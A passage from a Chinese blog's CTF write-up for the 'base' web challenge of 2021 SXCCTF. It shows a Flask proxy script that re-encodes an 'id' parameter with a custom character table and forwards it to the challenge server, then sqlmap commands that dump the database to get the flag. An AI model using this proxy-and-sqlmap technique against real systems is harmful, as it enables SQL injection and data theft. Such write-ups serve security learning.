&quot;聰&quot;: &quot;jw&quot;, &quot;聲&quot;: &quot;kA&quot;, &quot;聳&quot;: &quot;kQ&quot;, &quot;聴&quot;: &quot;kg&quot;,</span><br><span class="line">     &quot;聵&quot;: &quot;kw&quot;, &quot;聶&quot;: &quot;lA&quot;, &quot;職&quot;: &quot;lQ&quot;, &quot;聸&quot;: &quot;lg&quot;, &quot;聹&quot;: &quot;lw&quot;, &quot;聺&quot;: &quot;mA&quot;, &quot;聻&quot;: &quot;mQ&quot;, &quot;聼&quot;: &quot;mg&quot;, &quot;聽&quot;: &quot;mw&quot;, &quot;隆&quot;: &quot;nA&quot;,</span><br><span class="line">     &quot;垄&quot;: &quot;nQ&quot;, &quot;拢&quot;: &quot;ng&quot;, &quot;陇&quot;: &quot;nw&quot;, &quot;楼&quot;: &quot;oA&quot;, &quot;娄&quot;: &quot;oQ&quot;, &quot;搂&quot;: &quot;og&quot;, &quot;篓&quot;: &quot;ow&quot;, &quot;漏&quot;: &quot;pA&quot;, &quot;陋&quot;: &quot;pQ&quot;, &quot;芦&quot;: &quot;pg&quot;,</span><br><span class="line">     &quot;卢&quot;: &quot;pw&quot;, &quot;颅&quot;: &quot;qA&quot;, &quot;庐&quot;: &quot;qQ&quot;, &quot;炉&quot;: &quot;qg&quot;, &quot;掳&quot;: &quot;qw&quot;, &quot;卤&quot;: &quot;rA&quot;, &quot;虏&quot;: &quot;rQ&quot;, &quot;鲁&quot;: &quot;rg&quot;, &quot;麓&quot;: &quot;rw&quot;, &quot;碌&quot;: &quot;sA&quot;,</span><br><span class="line">     &quot;露&quot;: &quot;sQ&quot;, &quot;路&quot;: &quot;sg&quot;, &quot;赂&quot;: &quot;sw&quot;, &quot;鹿&quot;: &quot;tA&quot;, &quot;潞&quot;: &quot;tQ&quot;, &quot;禄&quot;: &quot;tg&quot;, &quot;录&quot;: &quot;tw&quot;, &quot;陆&quot;: &quot;uA&quot;, &quot;戮&quot;: &quot;uQ&quot;, &quot;驴&quot;: &quot;ug&quot;,</span><br><span class="line">     &quot;脌&quot;: &quot;uw&quot;, &quot;脕&quot;: &quot;vA&quot;, &quot;脗&quot;: &quot;vQ&quot;, &quot;脙&quot;: &quot;vg&quot;, &quot;脛&quot;: &quot;vw&quot;, &quot;脜&quot;: &quot;wA&quot;, &quot;脝&quot;: &quot;wQ&quot;, &quot;脟&quot;: &quot;wg&quot;, &quot;脠&quot;: &quot;ww&quot;, &quot;脡&quot;: &quot;xA&quot;,</span><br><span class="line">     &quot;脢&quot;: &quot;xQ&quot;, &quot;脣&quot;: &quot;xg&quot;, &quot;脤&quot;: &quot;xw&quot;, &quot;脥&quot;: &quot;yA&quot;, &quot;脦&quot;: &quot;yQ&quot;, &quot;脧&quot;: &quot;yg&quot;, &quot;脨&quot;: &quot;yw&quot;, &quot;脩&quot;: &quot;zA&quot;, &quot;脪&quot;: &quot;zQ&quot;, &quot;脫&quot;: &quot;zg&quot;,</span><br><span class="line">     &quot;脭&quot;: &quot;zw&quot;, &quot;脮&quot;: &quot;0A&quot;, &quot;脰&quot;: &quot;0Q&quot;, &quot;脳&quot;: &quot;0g&quot;, &quot;脴&quot;: &quot;0w&quot;, &quot;脵&quot;: &quot;1A&quot;, &quot;脷&quot;: &quot;1Q&quot;, &quot;脹&quot;: &quot;1g&quot;, &quot;脺&quot;: &quot;1w&quot;, &quot;脻&quot;: &quot;2A&quot;,</span><br><span class="line">     &quot;脼&quot;: &quot;2Q&quot;, &quot;脽&quot;: &quot;2g&quot;, &quot;脿&quot;: &quot;2w&quot;, &quot;谩&quot;: &quot;3A&quot;, &quot;芒&quot;: &quot;3Q&quot;, &quot;茫&quot;: &quot;3g&quot;, &quot;盲&quot;: &quot;3w&quot;, &quot;氓&quot;: &quot;4A&quot;, &quot;忙&quot;: &quot;4Q&quot;, &quot;莽&quot;: &quot;4g&quot;,</span><br><span class="line">     &quot;猫&quot;: &quot;4w&quot;, &quot;茅&quot;: &quot;5A&quot;, &quot;锚&quot;: &quot;5Q&quot;, &quot;毛&quot;: &quot;5g&quot;, &quot;矛&quot;: &quot;5w&quot;, &quot;铆&quot;: &quot;6A&quot;, &quot;卯&quot;: &quot;6Q&quot;, &quot;茂&quot;: &quot;6g&quot;, &quot;冒&quot;: &quot;6w&quot;, &quot;帽&quot;: &quot;7A&quot;,</span><br><span class="line">     &quot;貌&quot;: &quot;7Q&quot;, &quot;贸&quot;: &quot;7g&quot;, &quot;么&quot;: &quot;7w&quot;, &quot;玫&quot;: &quot;8A&quot;, &quot;枚&quot;: &quot;8Q&quot;, &quot;梅&quot;: &quot;8g&quot;, &quot;酶&quot;: &quot;8w&quot;, &quot;霉&quot;: &quot;9A&quot;, &quot;煤&quot;: &quot;9Q&quot;, &quot;没&quot;: &quot;9g&quot;,</span><br><span class="line">     &quot;眉&quot;: &quot;9w&quot;&#125;</span><br><span class="line">def encode(s):</span><br><span class="line">    s&#x3D;str(s)</span><br><span class="line">    res &#x3D; &#39;&#39;</span><br><span class="line">    for i in s:</span><br><span class="line">        res +&#x3D; a[i]</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">    id&#x3D;encode(request.args.get(&#39;id&#39;))</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;106.55.249.213:5001&#x2F;?user&#x3D;XAXwaAZAaQ&amp;id&#x3D;&#39;+id</span><br><span class="line">    return requests.get(url&#x3D;url).text</span><br><span class="line"></span><br><span class="line">app.run(debug&#x3D;True,port&#x3D;3389)</span><br></pre></td></tr></table></figure>
+
+<p>先本地跑下flask脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 harvey.py</span><br></pre></td></tr></table></figure>
+
+<p>接着就是sqlmap查下表就能得到flag：flag{SXC is very funny!}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1:3389?id&#x3D;1</span><br><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1:3389?id&#x3D;1 --dump p id</span><br></pre></td></tr></table></figure>
+
+<p>PS：艹，我这kali2020的sqlmap是假的，跑了十几分钟结果没跑出了<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3592519063.png"></p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/SXCTFHarvey.mp4">https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/SXCTFHarvey.mp4</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/02/21/2021SXCCTF/">http://example.com/2021/02/21/2021SXCCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mssn Harvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SXCCTF/">SXCCTF</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/SXCTF2021.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/28/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/ctfyx.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF-图片隐写那些事儿</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2988852155.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">学习资料</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Harvey</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Misc"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">Misc</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag%E4%B8%8D%E5%9C%A8%E8%BF%99"><span class="toc-number">2.</span> <span class="toc-text">Flag不在这</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%9B%E5%B9%B4%E5%A4%A7%E5%90%89"><span class="toc-number">3.</span> <span class="toc-text">牛年大吉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%B7%B1%E5%A4%84"><span class="toc-number">4.</span> <span class="toc-text">网络深处</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BC%E5%9B%BE"><span class="toc-number">5.</span> <span class="toc-text">拼图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Very-very-easy-hex"><span class="toc-number">6.</span> <span class="toc-text">Very very easy hex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#YLBNB"><span class="toc-number">7.</span> <span class="toc-text">YLBNB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Love-it"><span class="toc-number">8.</span> <span class="toc-text">Love_it!</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number"></span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#base"><span class="toc-number">1.</span> <span class="toc-text">base</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-Web分类练习"/></a><div class="content"><a class="title" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习">BUUCTF-Web分类练习</a><time datetime="2021-03-16T06:33:20.000Z" title="发表于 2021-03-16 14:33:20">2021-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告">DC-3靶机渗透测试报告</a><time datetime="2021-03-15T06:11:00.000Z" title="发表于 2021-03-15 14:11:00">2021-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/14/VNCTF%202021/" title="VNCTF 2021"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/653112701.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF 2021"/></a><div class="content"><a class="title" href="/2021/03/14/VNCTF%202021/" title="VNCTF 2021">VNCTF 2021</a><time datetime="2021-03-14T07:13:20.000Z" title="发表于 2021-03-14 15:13:20">2021-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" title="CTF-压缩包那些事儿"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/ctfysb.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-压缩包那些事儿"/></a><div class="content"><a class="title" href="/2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" title="CTF-压缩包那些事儿">CTF-压缩包那些事儿</a><time datetime="2021-03-12T06:11:00.000Z" title="发表于 2021-03-12 14:11:00">2021-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-2靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-2靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-2靶机渗透测试报告">DC-2靶机渗透测试报告</a><time datetime="2021-03-09T06:11:00.000Z" title="发表于 2021-03-09 14:11:00">2021-03-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harvey</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
